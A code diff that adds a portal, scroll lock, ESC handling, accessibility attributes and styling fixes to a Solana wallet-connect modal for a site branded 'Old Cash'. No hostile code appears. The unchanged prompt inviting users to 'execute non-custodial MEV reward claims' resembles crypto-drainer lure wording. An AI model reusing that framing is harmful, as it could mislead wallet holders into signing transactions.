@@ -1,14 +1,43 @@
 'use client';
 import { useState, useEffect } from 'react';
+import { createPortal } from 'react-dom';
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { shortAddr, LAMPORTS_PER_SOL } from '@/lib/config';
 
 export default function ConnectWalletModal({ isOpen, onClose, onScanWallet }) {
+  const [mounted, setMounted] = useState(false);
   const { wallets, select, wallet, connect, connected, publicKey, disconnect, sendTransaction } = useWallet();
   const { connection } = useConnection();
   const [balance, setBalance] = useState(null);
   const [copied, setCopied] = useState(false);
   const [errorMsg, setErrorMsg] = useState('');
+
+  // Mount tracking for SSR portal
+  useEffect(() => {
+    setMounted(true);
+  }, []);
+
+  // Prevent background body scroll when modal is open on desktop & mobile
+  useEffect(() => {
+    if (isOpen) {
+      const origOverflow = document.body.style.overflow;
+      document.body.style.overflow = 'hidden';
+      return () => {
+        document.body.style.overflow = origOverflow;
+      };
+    }
+  }, [isOpen]);
+
+  // ESC key listener to dismiss modal
+  useEffect(() => {
+    const handleKeyDown = (e) => {
+      if (e.key === 'Escape' && isOpen) {
+        onClose();
+      }
+    };
+    window.addEventListener('keydown', handleKeyDown);
+    return () => window.removeEventListener('keydown', handleKeyDown);
+  }, [isOpen, onClose]);
 
   // Fetch balance when connected
   useEffect(() => {
@@ -28,7 +57,7 @@ export default function ConnectWalletModal({ isOpen, onClose, onScanWallet }) {
     };
   }, [connected, publicKey, connection]);
 
-  if (!isOpen) return null;
+  if (!isOpen || !mounted) return null;
 
   const handleSelectWallet = async (wName) => {
     setErrorMsg('');
@@ -52,18 +81,29 @@ export default function ConnectWalletModal({ isOpen, onClose, onScanWallet }) {
     }
   };
 
-  return (
-    <div className="modal-backdrop" onClick={onClose}>
-      <div className="modal-card" style={{ maxWidth: 480 }} onClick={(e) => e.stopPropagation()}>
+  const modalContent = (
+    <div
+      className="modal-backdrop"
+      onClick={onClose}
+      role="dialog"
+      aria-modal="true"
+      aria-labelledby="connect-wallet-title"
+    >
+      <div
+        className="modal-card modal-card--wallet"
+        onClick={(e) => e.stopPropagation()}
+      >
         {/* Modal Window Header */}
         <div className="modal-header">
-          <span style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
+          <span id="connect-wallet-title" style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
             <img src="/assets/logo.jpg" alt="Old Cash" style={{ width: 18, height: 18, borderRadius: '50%' }} />
             <span>Wallet.Connect · Solana Mainnet</span>
           </span>
           <button
-            style={{ color: '#fff', fontSize: 16, cursor: 'pointer', background: 'none', border: 0 }}
+            className="modal-close-btn"
+            type="button"
             onClick={onClose}
+            aria-label="Close modal"
           >
             ✕
           </button>
@@ -112,12 +152,12 @@ export default function ConnectWalletModal({ isOpen, onClose, onScanWallet }) {
                   <span className="os-tag">{wallet?.adapter?.name || 'Solana Wallet'}</span>
                 </div>
                 <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 8 }}>
-                  <span style={{ fontFamily: 'var(--font-mono)', fontSize: 14, fontWeight: 700 }}>
+                  <span style={{ fontFamily: 'var(--font-mono)', fontSize: 14, fontWeight: 700, wordBreak: 'break-all' }}>
                     {shortAddr(publicKey.toBase58(), 6)}
                   </span>
                   <button
                     className="os-btn"
-                    style={{ padding: '3px 8px', fontSize: 11 }}
+                    style={{ padding: '4px 10px', fontSize: 11, flexShrink: 0 }}
                     onClick={handleCopyAddr}
                   >
                     {copied ? '✓ Copied' : '📋 Copy'}
@@ -129,13 +169,11 @@ export default function ConnectWalletModal({ isOpen, onClose, onScanWallet }) {
                 </div>
               </div>
 
-
-
               {/* Actions */}
-              <div style={{ display: 'flex', gap: 10 }}>
+              <div style={{ display: 'flex', gap: 10, flexWrap: 'wrap' }}>
                 <button
                   className="os-btn os-btn--pink"
-                  style={{ flex: 1, justifyContent: 'center' }}
+                  style={{ flex: 1, minWidth: 140, justifyContent: 'center' }}
                   onClick={() => {
                     if (onScanWallet) onScanWallet(publicKey.toBase58());
                     onClose();
@@ -145,7 +183,7 @@ export default function ConnectWalletModal({ isOpen, onClose, onScanWallet }) {
                 </button>
                 <button
                   className="os-btn"
-                  style={{ justifyContent: 'center' }}
+                  style={{ justifyContent: 'center', minWidth: 100 }}
                   onClick={() => disconnect()}
                 >
                   Disconnect
@@ -157,7 +195,7 @@ export default function ConnectWalletModal({ isOpen, onClose, onScanWallet }) {
                CONNECT PROVIDER SELECTION LIST
                ============================================================ */
             <div>
-              <p style={{ fontSize: 13, color: 'var(--ink-86)', marginBottom: 14 }}>
+              <p style={{ fontSize: 13, color: 'var(--ink-86)', marginBottom: 14, lineHeight: 1.4 }}>
                 Select an installed Solana wallet to scan and execute non-custodial MEV reward claims on Mainnet-Beta:
               </p>
 
@@ -168,29 +206,34 @@ export default function ConnectWalletModal({ isOpen, onClose, onScanWallet }) {
                     <button
                       key={w.adapter.name}
                       className="os-btn"
+                      type="button"
                       style={{
                         width: '100%',
                         justifyContent: 'space-between',
                         padding: '12px 14px',
                         background: 'var(--white)',
+                        cursor: 'pointer',
+                        textAlign: 'left',
                       }}
                       onClick={() => handleSelectWallet(w.adapter.name)}
                     >
-                      <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
+                      <div style={{ display: 'flex', alignItems: 'center', gap: 10, minWidth: 0, flex: 1 }}>
                         {w.adapter.icon && (
                           <img
                             src={w.adapter.icon}
                             alt={w.adapter.name}
                             width={24}
                             height={24}
-                            style={{ borderRadius: 4 }}
+                            style={{ borderRadius: 4, flexShrink: 0 }}
                           />
                         )}
-                        <span style={{ fontWeight: 700, fontSize: 14 }}>{w.adapter.name}</span>
+                        <span style={{ fontWeight: 700, fontSize: 14, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
+                          {w.adapter.name}
+                        </span>
                       </div>
                       <span
                         className={`os-tag ${isInstalled ? 'os-tag--green' : ''}`}
-                        style={{ fontSize: 10 }}
+                        style={{ fontSize: 10, flexShrink: 0 }}
                       >
                         {isInstalled ? '● Detected' : 'Available'}
                       </span>
@@ -234,5 +277,6 @@ export default function ConnectWalletModal({ isOpen, onClose, onScanWallet }) {
       </div>
     </div>
   );
-}
 
+  return createPortal(modalContent, document.body);
+}
